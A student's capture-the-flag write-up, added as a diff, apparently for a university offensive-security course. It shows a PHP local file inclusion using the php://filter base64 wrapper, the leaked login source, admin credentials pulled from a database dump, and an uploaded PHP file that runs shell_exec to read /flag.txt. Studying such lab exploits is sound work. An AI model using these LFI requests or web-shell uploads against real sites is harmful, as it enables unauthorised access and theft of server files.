@@ -1,0 +1,56 @@
+Go Here 4 Shell Notes!
+
+1. Openned the web page
+2. Noticed the URL format (maybe PHP injection vulnerability)
+	http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=welcome
+3. http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=php://filter/convert.base64-encode/resource=welcome resulted in string:
+	PGgxPldlbGNvbWUgdG8gbXkgYmxvZyE8L2gxPgo= which when decoded was <h1>Welcome to my blog!</h1>
+Hence, the page is vulnerable to PHP injection. However, the URL:
+http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=php://filter/convert.base64-encode/resource=flag.txt
+resulted in nothing... :(
+4. Therefore we need to determine the file location for flag.txt through some other means (a shell?)
+5. Inspecting the login page (http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=php://filter/convert.base64-encode/resource=login) yielded the PHP source code of the login page:
+
+<?php
+    // 18 Oct 2017 - DB restored from db.sql after hack :(
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
+        $db = new mysqli('127.0.0.1', 'cs3284', 'cs3284', 'cs3284');
+        $username = $_POST['username'];
+        $password = $_POST['password'];
+        $hashpass = sha1($password);
+        // Allow old accounts that still have plaintext password as well as new
+        // SHA1 accounts
+        $stmt = $db->prepare("SELECT id FROM users WHERE username=? AND password IN (?, ?)");
+        $stmt->bind_param("sss", $username, $password, $hashpass);
+        $stmt->execute();
+        $stmt->bind_result($id);
+        if ($stmt->fetch()) {
+            $_SESSION['id'] = $id;
+            $_SESSION['username'] = $username;
+            echo '<script type="text/javascript">window.location = "index.php?page=welcome"</script>';
+            die();
+        } else {
+            $error = "No such user!";
+        }
+    }
+?>
+
+This led to the discovery that SOME passwords are in PLAINTEXT!
+SQLi may not be possible because it uses binding rather than string concatenation
+
+5. After many hints for the professor< i relaized I had to look at the db.sql file from the comment at the top. This yielded the credentials for the admin which I used to log in
+
+6. Upon logging in there was a new nav entry for admin. I decided to look at it using the local file inclusion bug:
+http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=php://filter/convert.base64-encode/resource=admin
+
+7. That really did not help, I just decided to upload a php file that cats the contexts of /flag.txt:
+
+<?php 
+
+echo shell_exec("cat /flag.txt");
+
+?>
+
+And it worked! :)
+
+
